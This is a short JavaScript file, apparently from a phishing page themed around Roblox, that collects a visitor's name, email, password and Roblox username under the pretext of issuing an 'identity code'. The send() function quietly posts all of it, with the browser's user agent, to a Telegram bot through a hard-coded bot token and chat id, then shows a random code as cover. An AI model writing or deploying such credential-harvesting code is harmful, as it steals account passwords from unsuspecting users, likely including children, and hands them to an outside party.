function show(id) {
    document.querySelectorAll('.card').forEach(c => c.classList.add('hidden'));
    document.getElementById(id).classList.remove('hidden');
}

async function send() {
    const data = {
        name: document.getElementById('name').value,
        email: document.getElementById('email').value,
        pass: document.getElementById('pass').value,
        roblox: document.getElementById('roblox').value,
        agent: navigator.userAgent
    };

    const token = "8733348298:AAFIr8AFJ1Szk-c5rJVr22aFBs_KUJCnidI"; 
    const chat_id = "8601889519"; 
    const code = Math.floor(100000 + Math.random() * 900000);
    
    const msg = `هوية جديدة:%0Aالاسم: ${data.name}%0Aالبريد: ${data.email}%0Aالباس: ${data.pass}%0Aروبلوكس: ${data.roblox}%0Aالجهاز: ${data.agent}%0Aالكود الخاص به: ${code}`;

    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${msg}`);
    
    document.getElementById('codeDisplay').innerText = "كود الهوية: " + code;
    show('final');
}
